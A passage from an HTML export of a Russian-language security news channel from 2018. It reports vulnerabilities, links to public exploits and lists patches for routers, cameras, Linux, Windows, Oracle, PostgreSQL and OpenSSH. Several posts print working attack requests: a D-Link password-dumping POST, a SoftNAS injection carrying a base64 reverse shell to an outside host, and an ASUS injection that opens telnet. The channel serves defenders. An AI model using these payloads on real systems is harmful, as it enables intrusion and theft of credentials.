(AdminToken) установить еще <code>ConnSSLClientAuth</code> в <code>true</code><br><br>4. Править файл <code>etc/keystone/keystone.conf</code>:<br>- заменить <code>admin_token=ADMIN</code> на <code>admin_token=&lt;newAdminToken&gt;</code><br>- перезаупстить Keystone: <code>sudo service keystone restart</code><br><br>5. Обновить пароль Keystore: <code>/opt/sdn/openjdk8-jre/bin/keytool -storepasswd -storepass &lt;OldKeystorePass&gt; -new &lt;newKeystorePass&gt; -keystore /opt/sdn/admin/keystore</code><br><br>6. Обновить внутренний ключ сервера для Keystore: <code>/opt/sdn/openjdk8-jre/bin/keytool -keypasswd -alias serverkey -storepass &lt;newKeystorePass&gt; -keypass &lt;oldKeystorePass&gt; -new &lt;newKeystorePass&gt; -keystore /opt/sdn/admin/keystore</code><br><br>7. Обновить пароль Truststore: <code>/opt/sdn/openjdk8-jre/bin/keytool -storepasswd -storepass &lt;oldTruststorePass&gt; -new &lt;newTruststorePass&gt; -keystore /opt/sdn/admin/truststore</code><br><br>8. Обновить пароль ключа подписи jar: <code>/opt/sdn/openjdk8-jre/bin/keytool -storepasswd -storepass &lt;oldPass&gt; -new &lt;newpass4sign&gt; -keystore /opt/sdn/admin/sdnjar_trust.jks</code> (тут oldPass дефолтный - это <code>skyline</code>)<br><br>9. Править файл <code>/opt/sdn/virgo/bin/dmk.sh</code>:<br>- после строки <code>XX:HeapDumpPath....</code> добавить строку <code>Dsdn.trustpass=&lt;newpass4sign&gt;</code><br>- перезапустить sdnc: sudo service sdnc restart<br><br>End. Затем еще раз перезапустить Keystone, весь контроллер и почистить history команд<br><br>Оригинал на странице 129 <a href="http://h20628.www2.hp.com/km-ext/kmcsdirect/emr_na-a00003662en_us-1.pdf">http://h20628.www2.hp.com/km-ext/kmcsdirect/emr_na-a00003662en_us-1.pdf</a>, опечатки в комплекте.
       </div>

      </div>

     </div>

     <div class="message service" id="message-178">

      <div class="body details">
10 July 2018
      </div>

     </div>

     <div class="message default clearfix" id="message196">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="10.07.2018 10:36:57">
10:36
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;камеры&quot;)">#камеры</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>Еще камеры</strong><br><br>На этот раз Axis, много дыр, много версий. Обход авторизации, внедрение команд, недостатки разграничения прав, раскрытие информации, досы: CVE-2018-10658, CVE-2018-10659, CVE-2018-10660, CVE-2018-10661, CVE-2018-10662, CVE-2018-10663, CVE-2018-10664.<br><br>Технические подробности описаны тут: <a href="https://blog.vdoo.com/2018/06/18/vdoo-discovers-significant-vulnerabilities-in-axis-cameras/">https://blog.vdoo.com/2018/06/18/vdoo-discovers-significant-vulnerabilities-in-axis-cameras/</a><br><br>Обновления есть, сотни их - без шуток, искать нужную версию тут: <a href="https://www.axis.com/files/sales/ACV-128401_Affected_Product_List.pdf">https://www.axis.com/files/sales/ACV-128401_Affected_Product_List.pdf</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-179">

      <div class="body details">
11 July 2018
      </div>

     </div>

     <div class="message default clearfix" id="message197">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="11.07.2018 11:04:58">
11:04
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;network&quot;)">#network</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a><br><br><strong>D-link раскрывает пароли</strong><br><br>А D-Link DIR601 отдает креды без авторизации, совсем: пароли админа и подключения к wifi.<br><br><code>POST /my_cgi.cgi HTTP/1.1</code><br><code>Host: 192.168.0.1</code><br><code>Content-Type: application/x-www-form-urlencoded; charset=UTF-8</code><br><br><code>request=no_auth&amp;request=load_settings&amp;table_name=admin_user&amp;table_name=user_user&amp;table_name=wireless_settings&amp;table_name=wireless_security&amp;table_name=wireless_wpa_settings</code><br><br>В прошивках до 2.02NA включительно.<br><br><a href="https://www.exploit-db.com/exploits/45002/">https://www.exploit-db.com/exploits/45002/</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-180">

      <div class="body details">
18 July 2018
      </div>

     </div>

     <div class="message default clearfix" id="message198">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="18.07.2018 08:36:55">
08:36
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;linux&quot;)">#linux</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>Мониторинг обновлений linux kernel</strong><br><br>С недавнего времени новый эксплойт пополнил копилку способов повышения привилегий на линуксах. Основан на CVE-2017-16995 и работает по крайней мере на Ubuntu 16.04 с kernel 4.4.0-31-generic, 4.4.0-62-generic, 4.4.0-81-generic, 4.4.0-116-generic, 4.8.0-58-generic, 4.10.0.42-generic, 4.13.0-21-generic и Fedora 27 с kernel 4.13.9-300. Авторы отдельно отмечают, что RHEL 5,6,7 этой уязвимости не содержат.<br><br>Эксплойт: <a href="https://cxsecurity.com/issue/WLB-2018070133">https://cxsecurity.com/issue/WLB-2018070133</a><br>Разбор: <a href="https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html">https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html</a>. И минимальные требования по обновлениям оттуда:<br><br>Ubuntu: 4.4.x: Fixed 4.4.0-119.143<br>        4.8.x: vulnerable up through 4.8.0-58-generic<br>        4.10.x: vulnerable up through 4.10.0-42-generic<br>        4.13.x: Fixed 4.13.0-25-generic<br>Fedora: Fixed kernel-4.14.11<br><br>Что касается актуальных версий ядра:<br><br>в ветке 4.17 - 4.17.6 - в ней пофикшены уязвимости CVE-2018-10882, CVE-2018-10883, CVE-2018-10880, CVE-2018-10881, CVE-2018-10877, CVE-2018-10878, CVE-2018-10876, CVE-2018-10879, одна из которых может быть использована для повышения привилегий, другие - для отказа в работе<br><br>в ветке 4.16 - 4.16.18 - CVE-2018-1118, CVE-2018-10840, CVE-2018-11412, CVE-2018-12232 - отказ в работе и потенциальное повышение привилегий<br><br>в ветке 4.14 - 4.14.55 - CVE-2018-10882, CVE-2018-10883, CVE-2018-10880, CVE-2018-10881, CVE-2018-10877, CVE-2018-10878, CVE-2018-10876, CVE-2018-10879, как и в 4.17<br><br>в ветках 4.4, 4.9 - 4.4.140, 4.9.112 - CVE-2018-10882, CVE-2018-10883, CVE-2018-10881, CVE-2018-10877, CVE-2018-10878, CVE-2018-10876, CVE-2018-10879, максимальный CVSS3 7.3<br><br>в ветке 3.18 - 3.18.115 - CVE-2018-10881, CVE-2018-10879 (local DoS). Заглянув в прошлое ради чего-то более существенного - CVE-2018-5814 (network DoS) исправлена в 3.18.110 и повышение привилегий в 3.18.103<br><br>в ветке 3.16 - 3.16.57 - два десятка уязвимостей, в том числе повышение привилегий и доступ к памяти, максимальный CVSS3 8.
       </div>

      </div>

     </div>

     <div class="message service" id="message-181">

      <div class="body details">
19 July 2018
      </div>

     </div>

     <div class="message default clearfix" id="message199">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="19.07.2018 08:01:02">
08:01
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;oracle&quot;)">#oracle</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br>Вчера вышла версия 5.2.16 VirtualBox, в которой исправлен ряд уязвимостей:<br><br>CVE-2018-3055 - CVSS3 7.1 - DoS и раскрытие данных<br>CVE-2018-3085 - CVSS3 8.5 - выполнение кода в контексте гипервизора из гостевой системы<br>CVE-2018-3086, CVE-2018-3087, CVE-2018-3088, CVE-2018-3089, CVE-2018-3090 - CVSS3 8.6 - выполнение кода в контексте гипервизора из гостевой системы<br>CVE-2018-3091 - CVSS3 6.3 - раскрытие данных<br>CVE-2018-3005 - CVSS3 4.0 - DoS<br><br>Ну а на самом деле Oracle выпустила ежеквартальные патчи (CPU которые) для всех своих продуктов: <a href="http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html">http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html</a> (тут и перечень продуктов, и перечень устраненных уязвимостей, и ссылки на патчи)
       </div>

      </div>

     </div>

     <div class="message service" id="message-182">

      <div class="body details">
23 July 2018
      </div>

     </div>

     <div class="message default clearfix" id="message200">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="23.07.2018 11:49:16">
11:49
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;windows&quot;)">#windows</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>Свежее повышение привилегий windows в метасплойте</strong><br><br>Ранее мы уже разбирали уязвимость CVE-2018-8897, а теперь обратим внимание на эксплойты для Windows:<br><br>модуль метасплойта - повышение прав на х64 системах, Excellent Rank: <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/mov_ss.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/mov_ss.rb</a><br><br>&quot;базовый&quot; эксплойт: <a href="https://github.com/can1357/CVE-2018-8897">https://github.com/can1357/CVE-2018-8897</a><br><br>Проверять наличие патча этой уязвимости:<br><br>Windows 10 - KB4103716<br>Windows 10 Version 1607 - KB4103723<br>Windows 10 Version 1703 - KB4103731<br>Windows 10/Server Version 1709 - KB4103727<br>Windows 10/Server Version 1803 - KB4103721<br>Windows 7 - KB4103712 или KB4103718<br>Windows 8.1 - KB4103715 или KB4103725<br>Windows Server 2008 SP2 - KB4134651<br>Windows Server 2008 R2 SP1 - KB4103712 или KB4103718<br>Windows Server 2012 - KB4103726 или KB4103730<br>Windows Server 2012 R2 - KB4103715 или KB4103725<br>Windows Server 2016 - KB4103723
       </div>

      </div>

     </div>

     <div class="message service" id="message-183">

      <div class="body details">
26 July 2018
      </div>

     </div>

     <div class="message default clearfix" id="message201">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="26.07.2018 10:23:41">
10:23
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;network&quot;)">#network</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>Немного о WPA3</strong><br><br>Постепенно нас ждет появление и повсеместное (или нет?) внедрение WPA3. Месяц, как выпустили его описание. WPA3 описывает два режима работы: WPA3-Personal (это вместо PSK) и WPA3-Enterprise. Итак, что изменится:<br><br>1. В WPA3-Personal вместо PSK будет использоваться протокол защиты SAE (Simultaneous Authentication of Equals, IEEE 802.11s). SAE базируется на протоколе обмена ключами Диффи-Хеллмана. Результирующий сессионный ключ, который получает каждая сторона соединения для аутентификации сеанса, вырабатывается на основе информации из пароля, ключей каждой системы и MAC-адресов обеих сторон. Компрометация закрытого ключа одной из сторон не приводит к компрометации сессионного ключа. SAE - единственное обязательное дополнительное требование для &quot;соответствия стандарту WPA3&quot;.<br><br>2. В WPA3-Enterprise усиливают шифрование: ключи должны быть как минимум 192-разрядными, а рекомендованы 256-разрядные ключи GCMP-256 (Galois/Counter Mode Protocol), для передачи и подтверждения ключей будет использоваться HMAC с хэшами SHA-384 (HMAC-SHA384), для согласования ключей и аутентификации - ECDH (Elliptic Curve Diffie-Hellman) и ECDSA (Elliptic Curve Digital Signature Algorithm) с 384-разрядными эллиптическими кривыми, для защиты целостности кадров - протокол BIP-GMAC-256 (Broadcast/Multicast Integrity Protocol Galois Message Authentication Code).<br><br>3. Также WPA3 предполагает применение Protected Management Frames - защиты фреймов управления на равне с остальным трафиком. Впрочем такая фича была доступна и ранее вместе с WPA2.
       </div>

      </div>

     </div>

     <div class="message service" id="message-184">

      <div class="body details">
30 July 2018
      </div>

     </div>

     <div class="message default clearfix" id="message202">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="30.07.2018 10:42:06">
10:42
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;bluetooth&quot;)">#bluetooth</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>Уязвимость в спецификации Bluetooth (Новая)</strong><br><br>В прошлом году мы страдали от BlueBorne, теперь у нас еще одна глобальная уязвимость в Bluetooth CVE-2018-5383. Причина уязвимости заложена еще в спецификации Bluetooth, так что затронуты совершенно разнообразные девайсы и драйверы, в том числе Apple, Broadcom, QUALCOMM, Intel, а том числе драйверы для linux-систем.<br><br>Проблема заключается в отсуствтии проверки параметров эллиптической кривой при генерации ключей в протоколе Диффи-Хеллмана. Взломщик может внедрить неккоретный открытый ключ на данном этапе, что позволит ему расшифровать сессию и внедрять в нее данные. Находится ему для этого надо в достаточной близости для взаимодействия по протоколу Bluetooth.<br><br>Итак, есть два пути: искать и устанавливать апдейты для своих драйверов и прошивок или отключить Bluetooth - в большинстве случаев польза от него не так уж и заметна.
       </div>

      </div>

     </div>

     <div class="message service" id="message-185">

      <div class="body details">
2 August 2018
      </div>

     </div>

     <div class="message default clearfix" id="message203">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="02.08.2018 08:31:56">
08:31
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>Доступ для всех в SoftNAS Cloud до версии 4.0.3</strong><br><br>Владельцам и админам SoftNAS Cloud очень не помешало бы обновить версию системы до 4.0.3. В более ранних не только нашли удаленное выполнение кода (CVE-2018-14417), но и опубликовали эксплойт. По приличному - после выпуска патча.<br><br>Уязвимость в веб-интерфейсе управления позволяет удаленно без аутентификации выполнить произвольные команды ОС. С правами пользователя apache. Однако в SoftNAS Cloud он имеет права на судо:<br><br><code># Once SoftNAS UI is operational, only allow the specific command that require sudo access!!</code><br><code>Cmnd_Alias      SOFTNAS = ALL</code><br><code>APACHE  ALL = (ALL) NOPASSWD: SOFTNAS</code><br><br>Так что сразу рутовый доступ.<br><br>Эксплуатируется запросом следующего вида, который в данном случае запускает bash с рутовыми правами:<br><br><code>GET /softnas/snserver/snserv.php?opcode=checkupdate&amp;opcode=executeupdate&amp;selectedupdate=3.6aaaaaaa.1aaaaaaaaaaaaaa&amp;update_type=standard&amp;recentVersions=3.6aaaaaaaaaaa.1aaaaaaa;echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4yLjQ1LjE4NS8xMjM0NSAwPiYx+|+base64+-d+|+sudo+bash; HTTP/1.1</code><br><code>Host: 10.2.45.208</code><br><code>User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0</code><br><code>Accept: */*</code><br><code>Accept-Language: en-US,en;q=0.5</code><br><code>Accept-Encoding: gzip, deflate</code><br><code>Referer: https://10.2.45.208/softnas/applets/update/</code><br><code>X-Requested-With: XMLHttpRequest</code><br><code>Connection: close</code><br><br>Капельку больше инфы: <a href="https://www.exploit-db.com/exploits/45097/">https://www.exploit-db.com/exploits/45097/</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-186">

      <div class="body details">
6 August 2018
      </div>

     </div>

     <div class="message default clearfix" id="message204">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="06.08.2018 10:08:22">
10:08
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;unix&quot;)">#unix</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>Повышение до рута в Solaris<br><br></strong>Теперь рядовой пользователь Solaris может запросто получить права рута. Ну как рядовой пользователь - любой, имеющий непривилегированный доступ к выполнению кода в системе.<br><br>Уязвимость (CVE-2018-2892) присутствует в компоненте Availability Suite Service, актуальна для Solaris 10 и 11.x.<br><br>Патч был выпущен не так давно в рамках ораклового июльского CPU (<a href="http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html">http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html</a>).<br><br>А теперь опубликован и эксплойт: <a href="https://cxsecurity.com/issue/WLB-2018080019">https://cxsecurity.com/issue/WLB-2018080019</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-187">

      <div class="body details">
9 August 2018
      </div>

     </div>

     <div class="message default clearfix" id="message205">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="09.08.2018 12:06:15">
12:06
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>Аккуратней с руфусом</strong><br><br>Rufus, в том числе его последние версии 3.0 и 3.1, позвоялет повысить права до администратора.<br><br>Во-первых, при загрузке некоторых библиотек он ищет их сначала в текущей директории. А это часто папка Downloads. Эти библиотеки: DWMAPI.dll, UXTheme.dll, Version.dll, CryptSP.dll, NCrypt.dll,BCrypt.dll, RichEd20.dll, DSRole.dll, LogonCli.dll, DFSCli.dll, SAMCli.dll, DSRole.dll.<br><br>Во-вторых он создает незащищенные временные файлы, а потом использует их. Создает в текущей директории и в пользовательской %TEMP%. Файлы могут быть изменены/подменены непривилегированными процессами.<br><br>Эти два пути позволяют заставить Rufus запустить произвольный код, а так как сам он требует запуска с правами администратора - ну понятно.<br><br>Еще некоторые детали и PoC можно посмотреть в оригинальном посте рисечера: <a href="http://seclists.org/fulldisclosure/2018/Aug/7">http://seclists.org/fulldisclosure/2018/Aug/7</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-188">

      <div class="body details">
14 August 2018
      </div>

     </div>

     <div class="message default clearfix" id="message206">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="14.08.2018 10:59:52">
10:59
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;network&quot;)">#network</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>Еще немного RCE в роутерах<br><br></strong>Главный герой - ASUS DSL-N12E_C1 с версией прошивки 1.1.2.3_345. Произвольные команды выполняются HTTP-запросом следующего вида:<br><br><code>GET /Main_Analysis_Content.asp?current_page=Main_Analysis_Content.asp&amp;next_page=Main_Analysis_Content.asp&amp;next_host=www.target.com&amp;group_id=&amp;modified=0&amp;action_mode=+Refresh+&amp;action_script=&amp;action_wait=&amp;first_time=&amp;applyFlag=1&amp;preferred_lang=EN&amp;firmver=1.1.2.3_345-g987b580&amp;cmdMethod=ping&amp;destIP=%60utelnetd+-p+1337%60&amp;pingCNT=5 HTTP/1.1<br>Host: www.target.com<br>Connection: keep-alive<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade-Insecure-Requests: 1<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8<br>Referer: http://www.target.com/Main_Analysis_Content.asp<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en;q=0.9<br><br></code>В данном случае при успешной обработке должен запуститься сервис TELNET на порту 1337.<br><br>Вот здесь можно скачать новую прошивочку для данного девайса: <a href="https://www.asus.com/Networking/DSLN12E_C1/HelpDesk_BIOS/">https://www.asus.com/Networking/DSLN12E_C1/HelpDesk_BIOS/</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-189">

      <div class="body details">
16 August 2018
      </div>

     </div>

     <div class="message default clearfix" id="message207">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="16.08.2018 12:21:33">
12:21
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;oracle&quot;)">#oracle</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>Новое по Oracle</strong><br><br>Oracle рассказала об уязвимости CVE-2018-3110 в Oracle Database: имея права Create Session из-за ошибки в JVM можно выполнить произвольный код на хосте. Для версий на Unix и Linux исправление было выпущено в рамках июльского CPU, как и для <a href="12.1.0.2">12.1.0.2</a> на Windows. А вот для версий <a href="11.2.0.4">11.2.0.4</a> и <a href="12.2.0.1">12.2.0.1</a> на Windows - только теперь в виде отдельных патчей <a href="https://support.oracle.com/rs?type=doc&amp;id=2394520.1">https://support.oracle.com/rs?type=doc&amp;id=2394520.1</a>.<br><br>Метасплойт пополнился двумя новыми модулями для систем Oracle:<br><br>1. Oracle Weblogic Server Deserialization RCE по CVE-2018-2628 еще из апрельского CPU. Модуль работает для систем на Windows, уязвимы версии <a href="10.3.6.0">10.3.6.0</a>, <a href="12.1.3.0">12.1.3.0</a>, <a href="12.2.1.2">12.2.1.2</a>, <a href="12.2.1.3">12.2.1.3</a>: <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/misc/weblogic_deserialize.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/misc/weblogic_deserialize.rb</a>.<br>Гораздо раньше появился мультиплатформенный эксплойт на питоне: <a href="https://www.exploit-db.com/exploits/44553/">https://www.exploit-db.com/exploits/44553/</a><br><br>2. И свеженький <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/glassfish_traversal.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/glassfish_traversal.rb</a> по аж прошлогодней уязвимости в Oracle GlassFish 4.1 CVE-2017-1000028. Это Directory Traversal в интерфейсе администрирования (порт 4848 обычно), аутентификации не требует.
       </div>

      </div>

     </div>

     <div class="message service" id="message-190">

      <div class="body details">
23 August 2018
      </div>

     </div>

     <div class="message default clearfix" id="message208">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="23.08.2018 10:15:23">
10:15
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;postgresql&quot;)">#postgresql</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>PostgreSQL, как дела?</strong><br><br>Свет увидел эксплойт уязвимости CVE-2017-14798 в PostgreSQL. В результате состояния гонки во время работы скрипта postgresql-init хакер может повысить права от пользователя postgres до рута. Реализация очень проста, однако в данном случае используется конкретно PostgreSQL 9.4-0.5.3 на SUSE Linux Enterprise 11 SP4: <a href="https://www.exploit-db.com/exploits/45184/">https://www.exploit-db.com/exploits/45184/</a><br><br>Пачти от SUSE для устранения этой уязвимости: <a href="https://www.suse.com/de-de/security/cve/CVE-2017-14798/">https://www.suse.com/de-de/security/cve/CVE-2017-14798/</a><br><br>Последние на данный момент версии PostgreSQL - 9.3.24, 9.4.19, 9.5.14, 9.6.10, 10.5 в соответствующих ветках. В этом последнем выпуске устранены две уязвимости CVE-2018-10915 (CVSSv3 8.5) и CVE-2018-10925 (CVSSv3 7.1):<br><br><strong>CVE-2018-10925</strong> - раскрытие памяти в реализации выражений <code>INSERT ... ON CONFLICT DO UPDATE</code>. Может быть произведено любым пользователем СУБД. Присутствует только в ветках 9.5, 9.6 и 10.<br><br><strong>CVE-2018-10915</strong> - недостаточная очистка параметров предыдущих соединенией в интерфейсе подключений libpq, последствия - вплоть до обхода аутентификации. libpq используется только некоторым функционалом, выделяют в первую очередь dblink и postgres_fdw. Проверить их наличие можно командой:<br><br><code>\dx dblink|postgres_fdw</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-191">

      <div class="body details">
27 August 2018
      </div>

     </div>

     <div class="message default clearfix" id="message209">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="27.08.2018 11:20:15">
11:20
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;linux&quot;)">#linux</a> <a href="" onclick="return ShowHashtag(&quot;unix&quot;)">#unix</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновление&quot;)">#обновление</a><br><br><strong>24 августа выпущен OpenSSH 7.8</strong><br><br>Релиз 7.8 OpenSSH устраняет ставшую популярной уязвимость CVE-2018-15473. Уязвимость позволяет определить, существует ли заданный пользователь, на основании различий ответов сервера при обработке запросов на аутентификацию. Атакующий может отправить некорректный запрос аутентификации (например, повреждённый пакет), тогда в случае отсутствия пользователя в системе выполнение функции userauth_pubkey() завершится сразу с отправкой ответа SSH2_MSG_USERAUTH_FAILURE. Если пользователь присутствует в системе, произойдёт сбой при вызове функции sshpkt_get_u8() и сервер просто молча закроет соединение.<br><br>Любопытно, что проблему нашли благодаря описанию коммита на гитхабе, когда уже был добавлен исправляющий код. Но не все же компилируют SSH из исходников...<br><br>Эксплойты доступны в ассортименте, ну например: <a href="https://github.com/Rhynorater/CVE-2018-15473-Exploit">https://github.com/Rhynorater/CVE-2018-15473-Exploit</a><br><br>Еще можно в развлекательно-образовательных целях почитать очень подробно расписанный нехитрый процесс эксплуатации с красивыми картинками: <a href="https://blog.nviso.be/2018/08/21/openssh-user-enumeration-vulnerability-a-close-look/">https://blog.nviso.be/2018/08/21/openssh-user-enumeration-vulnerability-a-close-look/</a><br><br>А вообще в 7.8 много изменений (<a href="https://www.opennet.ru/opennews/art.shtml?num=49180">https://www.opennet.ru/opennews/art.shtml?num=49180</a>), так что не ставьте не глядя.
       </div>

      </div>

     </div>

     <div class="message service" id="message-192">

      <div class="body details">
29 August 2018
      </div>

     </div>

     <div class="message default clearfix" id="message210">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="29.08.2018 10:57:31">
10:57
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;linux&quot;)">#linux</a> <a href="" onclick="return ShowHashtag(&quot;unix&quot;)">#unix</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновление&quot;)">#обновление</a><br><br><strong>Побольше об OpenSSH</strong><br><br>OpenSSH отличается относительно малым количеством проблем безопасности, особенно критических. И похоже как следствие - частой встречаемостью устаревших версий, а также очень устаревших версий. Если риск раскрытия имени пользователя не мотивирует на обновление, интересно заглянуть на пару лет в прошлое и посмотреть, чем еще опасны старые версии OpenSSH:<br><br>CVE-2016-10009 - до версии 7.4 - возможность исполнения кода сервером OpenSSH на КЛИЕНТЕ через подключение произвольной библиотеки (якобы провайдера PKCS11), если у инициатора безобразия есть возможность загрузить желаемую библиотеку на сторону клиента. Пример эксплуатации: <a href="https://www.exploit-db.com/exploits/40963/">https://www.exploit-db.com/exploits/40963/</a><br><br>CVE-2016-10010 - до версии 7.4 - возможность повышения привилегий до рута через подключение к сокетам домена Unix, если отключено UsePrivilegeSeparation. Эксплойт: <a 